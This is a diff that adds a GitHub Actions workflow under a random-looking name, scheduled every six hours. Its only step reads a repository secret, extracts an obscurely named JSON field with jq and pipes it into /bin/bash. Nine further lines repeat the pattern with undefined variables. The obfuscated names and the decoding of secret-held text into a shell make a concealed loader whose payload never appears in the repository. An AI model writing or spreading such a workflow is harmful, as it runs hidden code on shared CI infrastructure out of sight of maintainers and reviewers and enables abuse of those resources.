@@ -1,0 +1,27 @@
+name: yuexiaxiufeng
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '42 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: yuexiaxiufeng
+        env:
+          k7: ${{ secrets.k7 }}
+        run: |
+          echo $k7 | jq -r .zkzf3334 | /bin/bash
+          echo $wfcuq67195 | jq -r .hxbb41873 | /bin/bash
+          echo $zs964 | jq -r .v499 | /bin/bash
+          echo $sjdrk1061 | jq -r .gpepo091 | /bin/bash
+          echo $xe931 | jq -r .aqa373 | /bin/bash
+          echo $gwe9 | jq -r .kf67 | /bin/bash
+          echo $qqjd45 | jq -r .bepoh346 | /bin/bash
+          echo $mg717 | jq -r .z9 | /bin/bash
+          echo $r2364 | jq -r .d18865 | /bin/bash
+          echo $a179 | jq -r .vn684 | /bin/bash
+
